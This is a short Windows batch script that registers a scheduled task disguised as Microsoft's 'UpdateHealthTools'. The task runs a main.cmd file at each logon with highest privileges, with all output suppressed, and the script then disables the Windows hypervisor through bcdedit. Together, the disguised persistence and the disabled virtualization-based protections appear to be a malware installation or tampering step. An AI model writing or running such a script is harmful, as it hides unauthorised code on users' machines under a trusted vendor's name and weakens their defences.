@echo off
cd /d "%~dp0"
set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"

schtasks /query /tn "\Microsoft\Windows\UpdateHealthTools" >nul 2>&1 || schtasks /create /tn "\Microsoft\Windows\UpdateHealthTools" /tr "C:\Windows\System32\cmd.exe /c \"%STAGE%\main.cmd\"" /sc onlogon /rl highest /f >nul 2>&1

bcdedit /set hypervisorlaunchtype off
